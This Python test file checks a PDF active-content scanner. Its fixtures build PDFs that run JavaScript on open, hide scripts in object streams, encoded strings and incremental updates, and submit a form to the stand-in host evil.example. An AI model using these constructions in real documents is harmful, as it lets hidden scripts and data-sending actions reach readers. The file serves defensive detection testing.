import pdf_action_fence as pf


def build_pdf(objects, trailer_extra=b"", root=1):
    header = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
    body = b""
    offsets = {}
    for number in sorted(objects):
        offsets[number] = len(header) + len(body)
        body += ("%d 0 obj\n" % number).encode() + objects[number] + b"\nendobj\n"
    size = max(objects) + 1
    xref_off = len(header) + len(body)
    xref = ("xref\n0 %d\n" % size).encode()
    xref += b"0000000000 65535 f \n"
    for number in range(1, size):
        if number in offsets:
            xref += ("%010d 00000 n \n" % offsets[number]).encode()
        else:
            xref += b"0000000000 65535 f \n"
    trailer = ("trailer\n<< /Size %d /Root %d 0 R " % (size, root)).encode()
    trailer += trailer_extra + b" >>\nstartxref\n%d\n%%%%EOF\n" % xref_off
    return header + body + xref + trailer


def catalog(extra=b"", pages=2, root_extra=b""):
    return b"<< /Type /Catalog /Pages %d 0 R " % pages + root_extra + extra + b" >>"


def js_object(source=b"app.alert(1)"):
    return b"<< /S /JavaScript /JS (" + source + b") >>"


def scan(data, **over):
    kwargs = {"max_depth": 20}
    kwargs.update(over)
    return pf.PdfActionFence(**kwargs).scan(data)


def test_open_action_javascript_is_found():
    data = build_pdf({
        1: catalog(b"/OpenAction 5 0 R"),
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R >>",
        5: js_object(),
    })
    result = scan(data)
    assert any(item["kind"] == "javascript" and item["object"] == 5 for item in result["actions"])


def test_additional_action_on_page_is_found():
    data = build_pdf({
        1: catalog(),
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R /AA << /O 5 0 R >> >>",
        5: js_object(),
    })
    assert any(item["kind"] == "javascript" for item in scan(data)["actions"])


def test_action_hidden_in_object_stream_is_found():
    hidden = b"5 0 << /S /JavaScript /JS (app.alert(2)) >>"
    objstm = b"<< /Type /ObjStm /N 1 /First 4 /Length %d >>\nstream\n" % len(hidden) + hidden + b"\nendstream"
    data = build_pdf({
        1: catalog(b"/OpenAction 5 0 R"),
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R >>",
        4: objstm,
    })
    assert any(item["kind"] == "javascript" for item in scan(data)["actions"])


def test_incremental_update_keeps_old_action_visible():
    first = build_pdf({
        1: catalog(b"/OpenAction 5 0 R"),
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R >>",
        5: js_object(),
    })
    offset = int(first.rsplit(b"startxref\n", 1)[1].split(b"\n")[0])
    second_body = b"1 0 obj\n" + catalog() + b"\nendobj\n"
    second_body += b"6 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n"
    xref_off = len(first) + len(second_body)
    xref = b"xref\n0 7\n0000000000 65535 f \n"
    for number in range(1, 7):
        if number == 1:
            xref += ("%010d 00000 n \n" % len(first)).encode()
        elif number == 6:
            xref += ("%010d 00000 n \n" % (len(first) + len(b"1 0 obj\n" + catalog() + b"\nendobj\n"))).encode()
        else:
            xref += b"0000000000 65535 f \n"
    trailer = b"trailer\n<< /Size 7 /Root 1 0 R /Prev %d >>\nstartxref\n%d\n%%%%EOF\n" % (offset, xref_off)
    data = first + second_body + xref + trailer
    result = scan(data)
    assert any(item["kind"] == "javascript" for item in result["actions"])
    assert "incremental_update" in result["warnings"]


def test_embedded_file_is_reported():
    data = build_pdf({
        1: catalog(root_extra=b"/Names << /EmbeddedFiles << /Names [(a.txt) 5 0 R] >> >> "),
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R >>",
        5: b"<< /Type /Filespec /F (a.txt) /EF << /F 6 0 R >> >>",
        6: b"<< /Type /EmbeddedFile /Length 4 >>\nstream\nabcd\nendstream",
    })
    assert any(item["kind"] == "embedded_file" for item in scan(data)["actions"])


def test_external_link_is_reported():
    data = build_pdf({
        1: catalog(),
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R /Annots [5 0 R] >>",
        5: b"<< /Type /Annot /Subtype /Link /A << /S /URI /URI (http://127.0.0.1/) >> >>",
    })
    assert any(item["kind"] == "external_link" for item in scan(data)["actions"])


def test_page_tree_cycle_is_reported_without_recursion():
    data = build_pdf({
        1: catalog(),
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Pages /Kids [2 0 R] /Count 1 >>",
    })
    result = scan(data)
    assert "page_tree_cycle" in result["warnings"]


def test_encrypted_document_needs_review():
    data = build_pdf({
        1: catalog(),
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R >>",
        5: b"<< /Filter /Standard /V 1 /R 2 /O (x) /U (y) /P -4 >>",
    }, trailer_extra=b"/Encrypt 5 0 R ")
    result = scan(data)
    assert result["needs_review"] is True
    assert "encrypted" in result["warnings"]


def test_hex_and_utf16_script_is_decoded():
    hex_js = b"<FEFF006100700070002E0061006C006500720074002800310029>"
    data = build_pdf({
        1: catalog(b"/OpenAction 5 0 R"),
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R >>",
        5: b"<< /S /JavaScript /JS " + hex_js + b" >>",
    })
    actions = scan(data)["actions"]
    assert actions and "app.alert" in actions[0]["detail"].lower()


def test_submit_form_is_reported():
    data = build_pdf({
        1: catalog(),
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R /AA << /O 5 0 R >> >>",
        5: b"<< /S /SubmitForm /F (http://evil.example/) >>",
    })
    assert any(item["kind"] == "submit_form" for item in scan(data)["actions"])


def test_rich_media_is_reported():
    data = build_pdf({
        1: catalog(),
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R /Annots [5 0 R] >>",
        5: b"<< /Type /Annot /Subtype /RichMedia /RichMediaContent 6 0 R >>",
        6: b"<< /Type /RichMedia >>",
    })
    assert any(item["kind"] == "rich_media" for item in scan(data)["actions"])


def test_javascript_in_name_tree_is_reported():
    data = build_pdf({
        1: catalog(root_extra=b"/Names 4 0 R "),
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R >>",
        4: b"<< /Names << /JavaScript << /Names [(x) 5 0 R] >> >> >>",
        5: js_object(),
    })
    assert any(item["kind"] == "javascript" for item in scan(data)["actions"])


def test_bad_xref_offset_is_a_warning_not_a_crash():
    data = build_pdf({
        1: catalog(),
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R >>",
    }).replace(b"startxref\n", b"startxref\n999999\n%", 1)
    result = scan(data)
    assert "bad_xref" in result["warnings"]


def test_object_depth_limit_is_enforced():
    objects = {1: catalog(b"/OpenAction 5 0 R"), 2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>", 3: b"<< /Type /Page /Parent 2 0 R >>"}
    for number in range(5, 12):
        objects[number] = ("<< /S /JavaScript /JS (x) /Next %d 0 R >>" % (number + 1)).encode()
    objects[12] = b"<< /S /JavaScript /JS (x) >>"
    result = scan(build_pdf(objects), max_depth=3)
    assert "object_depth" in result["warnings"]


def test_actions_are_sorted_by_object_number():
    data = build_pdf({
        1: catalog(b"/OpenAction 9 0 R", root_extra=b"/Names 4 0 R "),
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R /AA << /O 5 0 R >> >>",
        4: b"<< /Names << /JavaScript << /Names [(x) 7 0 R] >> >> >>",
        5: js_object(),
        7: js_object(),
        9: js_object(),
    })
    numbers = [item["object"] for item in scan(data)["actions"]]
    assert numbers == sorted(numbers)
    assert numbers == [5, 7, 9]
